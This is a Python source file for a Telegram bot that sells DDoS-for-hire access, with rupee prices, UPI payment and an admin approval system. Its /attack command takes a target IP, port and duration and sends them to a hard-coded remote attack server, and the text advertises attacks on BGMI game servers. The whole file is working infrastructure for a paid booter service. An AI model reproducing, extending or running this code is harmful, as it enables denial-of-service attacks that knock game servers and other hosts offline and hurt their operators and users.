import time
import requests
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update
import asyncio
from datetime import datetime, timedelta

TELEGRAM_TOKEN = ""
ADMIN_ID = 664
SECOND_ADMIN_ID = 1397
BOT_OWNER = "soulcracks_owner"

approved_users = {}
active_attacks = {}
is_attack_running = False

def is_admin(user_id: int):
    return user_id == ADMIN_ID or user_id == SECOND_ADMIN_ID

def is_approved(user_id: int):
    if user_id in approved_users:
        expiry_time = approved_users[user_id]['expiry_time']
        return datetime.now() < expiry_time
    return False

def approve_user(user_id: int, days: int):
    expiry_time = datetime.now() + timedelta(days=days)
    approved_users[user_id] = {
        'expiry_time': expiry_time,
        'approved_days': days
    }

approve_user(ADMIN_ID, 36500)
approve_user(SECOND_ADMIN_ID, 36500)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = """
𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 🚀 𝐌𝐑.𝐗 𝐔𝐋𝐓𝐑𝐀 𝐏𝐎𝐖𝐄𝐑 𝐃𝐃𝐎𝐒 🚀

🤖 𝐁𝐎𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:

/start - 𝐁𝐨𝐭 𝐒𝐭𝐚𝐫𝐭 𝐊𝐚𝐫𝐞𝐧
/id - 𝐀𝐩𝐧𝐚 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐂𝐡𝐞𝐜𝐤 𝐊𝐚𝐫𝐞𝐧
/attack <ip> <port> <time> - 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐭𝐚𝐫𝐭 𝐊𝐚𝐫𝐞𝐧
/myapproval - 𝐀𝐩𝐧𝐚 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐡𝐞𝐜𝐤 𝐊𝐚𝐫𝐞𝐧

🔒 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝐫𝕤 𝕆𝕟𝕝𝕪
⚠️ 𝕌𝕟𝕒𝕦𝕥𝕙𝕠𝕣𝕚𝕫𝕖𝕕 𝕦𝕤𝕖 𝕨𝕚𝕝𝕝 𝕣𝕖𝕤𝕦𝕝𝕥 𝕚𝕟 𝕓𝕒𝕟

💰 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓:

📅 1 𝐃𝐚𝐲 - 200 𝐑𝐬
📅 7 𝐃𝐚𝐲𝐬 - 700 𝐑𝐬  
📅 30 𝐃𝐚𝐲𝐬 - 2000 𝐑𝐬

💸 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝𝐬:
📲 𝐏𝐚𝐲𝐓𝐌 / 𝐔𝐏𝐈 / 𝐆𝐨𝐨𝐠𝐥𝐞 𝐏𝐚𝐲

𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫 𝐟𝐨𝐫 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 👇
𝐎𝐖𝐍𝐄𝐑 : @soulcracks_owner
    """
    await update.message.reply_text(welcome_msg)

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    
    user_info = f"""
👤 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍:

🆔 𝐔𝐬𝐞𝐫 𝐈𝐃 : `{user_id}`
📛 𝐍𝐚𝐦𝐞 : {first_name}
🔗 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : @{username if username else "N/A"}

📝 𝐍𝐨𝐭𝐞: 𝐘𝐨𝐮𝐫 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐜𝐨𝐩𝐲 𝐤𝐚𝐫𝐤𝐞 𝐨𝐰𝐧𝐞𝐫 𝐤𝐨 𝐬𝐞𝐧𝐝 𝐤𝐚𝐫𝐞𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐤𝐞 𝐥𝐢𝐲𝐞
    """
    await update.message.reply_text(user_info)

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to approve users.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days (1-30)>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 1 or days > 30:
            await update.message.reply_text("⚠️ Please provide days between 1 and 30.")
            return
            
        approve_user(target_id, days)
        expiry_time = approved_users[target_id]['expiry_time']
        expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
        
        await update.message.reply_text(f"✅ User {target_id} approved for {days} days!\n⏰ Expiry: {expiry_str}")
        
    except ValueError:
        await update.message.reply_text("⚠️ Please provide valid user ID and days (integers).")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running
    
    user_id = update.effective_user.id
    if not is_approved(user_id):
        if user_id in approved_users:
            expiry_time = approved_users[user_id]['expiry_time']
            if datetime.now() >= expiry_time:
                del approved_users[user_id]
                await update.message.reply_text("❌ Your approval has expired. Please contact admin.")
                return
        await update.message.reply_text("❌ You are not approved to use this command. Please contact admin.")
        return
    
    if is_attack_running:
        await update.message.reply_text("⚠️ 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 ⚠️\n\n🚫 𝐁𝐎𝐓 𝐈𝐒 𝐁𝐔𝐒𝐘 🚫\n\n📛 𝐂𝐔𝐑𝐑𝐄𝐍𝐓𝐋𝐘 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 📛\n\n✅ 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐅𝐈𝐍𝐈𝐒𝐇 ✅")
        return
        
    # सिर्फ 3 parameters
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time_in_seconds>")
        return

    ip, port, time_s = context.args
    
    attack_msg = f"""
⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋ℝ𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐘 :- @soulcracks_owner
🚀 𝐓𝐀𝐑𝐆𝐄𝐓 :- {ip}
🎯 𝐏𝐎𝐑𝐓 :- {port}
⏰ 𝐓𝐈𝐌𝐄 :- {time_s}
🇮𝐍 𝐆𝐀𝐌𝐄 : 𝐁𝐆𝐌𝐈

𝐒𝐓𝐀𝐓𝐔𝐒 : 🟢 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆...

𝐎𝐖𝐍𝐄𝐑 : @soulcracks_owner
    """
    sent_message = await update.message.reply_text(attack_msg)
    
    is_attack_running = True
    
    attack_id = f"{user_id}_{int(time.time())}"
    active_attacks[attack_id] = {
        'user_id': user_id,
        'chat_id': update.effective_chat.id,
        'ip': ip,
        'port': port,
        'time': time_s,
        'message_id': sent_message.message_id
    }
    
    asyncio.create_task(send_attack_request(attack_id, ip, port, time_s))

async def send_attack_request(attack_id, ip, port, time_s):
    url = f"http://72.60.39.128:3001/vipxowner9powerbysoulcrack/"
    # सिर्फ 3 parameters भेजो
    params = {'ip': ip, 'port': port, 'time': time_s}
    
    try:
        response = requests.get(url, params=params, timeout=10)
        if response.status_code != 200:
            application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
            await application.bot.send_message(
                chat_id=active_attacks[attack_id]['chat_id'],
                text=f"⚠️ Failed to start attack. Server responded with status code {response.status_code}."
            )
            is_attack_running = False
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            return
    except requests.RequestException as e:
        application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
        await application.bot.send_message(
            chat_id=active_attacks[attack_id]['chat_id'],
            text=f"⚠️ Network error: {e}"
        )
        is_attack_running = False
        if attack_id in active_attacks:
            del active_attacks[attack_id]
        return
    
    asyncio.create_task(attack_completion(attack_id, int(time_s)))

async def attack_completion(attack_id, duration):
    global is_attack_running
    
    await asyncio.sleep(duration)
    
    if attack_id in active_attacks:
        attack_info = active_attacks[attack_id]
        chat_id = attack_info['chat_id']
        
        application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
        await application.bot.send_message(
            chat_id=chat_id,
            text="✅ 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃! 🔥"
        )
        
        del active_attacks[attack_id]
        is_attack_running = False

async def myapproval(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in approved_users:
        expiry_time = approved_users[user_id]['expiry_time']
        days = approved_users[user_id]['approved_days']
        expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
        
        if datetime.now() < expiry_time:
            remaining = expiry_time - datetime.now()
            remaining_days = remaining.days
            remaining_hours = remaining.seconds // 3600
            
            await update.message.reply_text(
                f"✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑 ✅\n\n"
                f"📅 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐅𝐎𝐑 : {days} days\n"
                f"⏰ 𝐄𝐗𝐏𝐈𝐑𝐘 𝐃𝐀𝐓𝐄 : {expiry_str}\n"
                f"🕒 𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 : {remaining_days} days {remaining_hours} hours"
            )
        else:
            await update.message.reply_text("❌ Your approval has expired. Please contact admin.")
    else:
        await update.message.reply_text("❌ You are not approved. Please contact admin.")

def main():
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myapproval", myapproval))
    application.run_polling()

if __name__ == "__main__":
    main()